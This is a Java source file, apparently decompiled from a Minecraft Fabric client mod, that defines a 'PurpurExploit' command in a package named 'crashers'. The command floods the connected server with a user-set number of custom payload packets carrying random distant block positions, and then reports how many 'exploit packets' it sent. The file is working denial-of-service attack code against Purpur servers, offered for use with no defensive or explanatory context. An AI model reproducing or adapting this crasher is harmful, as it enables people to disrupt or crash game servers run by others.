package me.nullnet.voxelclient.crashers;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.context.CommandContext;
import me.nullnet.voxelclient.packets.PurpurPayloadPacket;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_2338;
import net.minecraft.class_2817;
import net.minecraft.class_5819;

public class PurpurExploit {
   public static int execute(CommandContext<FabricClientCommandSource> ctx) {
      long now = System.currentTimeMillis();
      int packets = IntegerArgumentType.getInteger(ctx, "packets");
      (new Thread(() -> {
         class_5819 random = class_5819.method_43047();

         for(int i = 0; i < packets; ++i) {
            long position = (new class_2338(random.method_39332(-30000000, 30000000), random.method_39332(250, 254), random.method_39332(-30000000, 30000000))).method_10063();
            ((FabricClientCommandSource)ctx.getSource()).getClient().method_1562().method_52787(new class_2817(new PurpurPayloadPacket(position)));

            try {
               Thread.sleep(50L);
            } catch (Exception var7) {
               ((FabricClientCommandSource)ctx.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5PurpurExploit&8] &7Unable to sleep &650ms&7."), false);
            }
         }

      })).start();
      FabricClientCommandSource var10000 = (FabricClientCommandSource)ctx.getSource();
      String var10001 = "&8[&5&lVoxel&8] &8[&5PurpurExploit&8] &7Sent &5%d &7exploit packets. &8[&6".formatted(new Object[]{packets});
      var10000.sendFeedback(ColorUtil.translate(var10001 + (System.currentTimeMillis() - now) + "ms&8]"));
      return 1;
   }
}
